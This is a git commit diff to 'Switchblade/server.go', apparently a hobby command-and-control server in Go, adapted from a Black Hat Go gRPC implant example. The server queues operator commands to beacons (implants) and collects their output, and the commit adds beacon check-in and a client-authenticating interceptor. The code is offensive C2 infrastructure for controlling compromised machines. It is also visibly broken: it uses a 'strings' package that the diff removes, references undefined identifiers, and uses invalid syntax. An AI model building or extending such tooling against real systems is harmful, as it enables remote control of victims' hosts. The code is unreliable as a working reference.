809dbf5aa74d74916e3215afa8bc7996aac45297
matt-culbert <culbertmatt@gmail.com>
2021-12-19 18:44:43 -0500

    Update server.go

--- Switchblade/server.go
+++ Switchblade/server.go
@@ -9,12 +9,11 @@ import (
         "log"
         "errors"
         "net"
-	"time"
-	"strings"
 
 	"github.com/blackhat-go/bhg/ch-14/grpcapi"
         "google.golang.org/grpc"
         "google.golang.org/grpc/credentials"
+	"google.golang.org/grpc/metadata"
 
 )
 
@@ -23,21 +22,22 @@ type implantServer struct {
 }
 
 type adminServer struct {
-        work, output, adminCommands chan *grpcapi.Command // we're adding adminCommands here to this type. These will be server specific and don't get sent to beacons
+        work, output chan *grpcapi.Command // we're adding adminCommands here to this type. These will be server specific and don't get sent to beacons
 }
 
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
+	// I think we should add the implant checkin here
         s := new(implantServer)
         s.work = work
         s.output = output
         return s
 }
 
-func NewAdminServer(adminCommand, work, output chan *grpcapi.Command) *adminServer {
+func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
         s := new(adminServer)
         s.work = work
         s.output = output
-		s.adminCommands = adminCommand
+
         return s
 }
 
@@ -60,40 +60,48 @@ func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command)
         return &grpcapi.Empty{}, nil
 }
 
-func (s *adminServer) AdminCommand(ctx context.Context, adminCommand *grpcapi.Command) (*grpcapi.Command, error) {
-	return res, nil
-}// I think we need to make a new function here and in thew NewAdminServer we need to do a check on what command is passed??
-
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
         var res *grpcapi.Command
 		// if cmd.startsWith('1') then s.work <- cmd else s.adminCommands <- cmd
+		// but right now we can't use a strings method because cmd isn't a string and we can't recast it....
 		// case listClients, case removeClient, etc...
 		// maybe we have to cast cmd to s.adminCommand and check it outside of here before giving it to s.work?
-		if strings.HasSuffix(cmd, "1") {
-			go func() { // this function takes in the command and sends it to the work queue, we should add some logic here to check if it's an admin command or an implant command
-				s.work <- cmd // this is the worker queue, we added adminCommands up top
-			}()
-			res = <-s.output
-		}
+		go func() { // this function takes in the command and sends it to the work queue, we should add some logic here to check if it's an admin command or an implant command
+			s.work <- cmd // this is the worker queue, we added adminCommands up top
+		}()
+		res = <-s.output
 		return res, nil
 
 }
 
-func (s *implantServer) RegisterClient(ctx context.Context) {
-	client := make(map[string]string)
-	tempHold = <- s.output // using the s channel, get the output. Need to find better way to get hello from beacon
-	_,err := set[tempHold] // check if beacon already registered
-	if err != nil{pass} // if there is an error, do nothing
-	dt := time.Now()
-	client[tempHold] = dt.String() // otherwise add our new name to the set
+func (s *implantServer) RegisterClient(ctx context.Context) (string, error) {
+	if md, ok := metadata.FromIncomingContext(ctx); ok {
+		clientName := strings.Join(md["name"], "")
+		log.Printf("New beacon: %s", clientName)
+		return "200 ",nil
+	}
+	return "", fmt.Errorf("missing name")
+}
+
+func unaryInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
+	s, ok := info.Server.(*api.Server)
+	if !ok {
+		return nil, fmt.Errorf("unable to cast server")
+	}
+	clientID, err := authenticateClient(ctx, s)
+	if err != nil {
+		return nil, err
+	}
+	ctx = context.WithValue(ctx, clientIDKey, clientID)
+	return handler(ctx, req)
 }
 
 func main() {
         var (
                 implantListener, adminListener net.Listener
                 err                            error
-                opts                           []grpc.ServerOption
-                work, output, adminCommand     chan *grpcapi.Command
+                opts                           []grpc.ServerOption{grpc.unaryInterceptor(unaryInterceptor)}
+                work, output				   chan *grpcapi.Command
         )
 
 		certificate, err := tls.LoadX509KeyPair(
@@ -118,9 +126,9 @@ func main() {
 		ClientCAs:    certPool,
 	}
 
-        work, output, adminCommand = make(chan *grpcapi.Command), make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
         implant := NewImplantServer(work, output)
-        admin := NewAdminServer(work, output, adminCommand)
+        admin := NewAdminServer(work, output)
         if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
                 log.Fatal(err)
         }
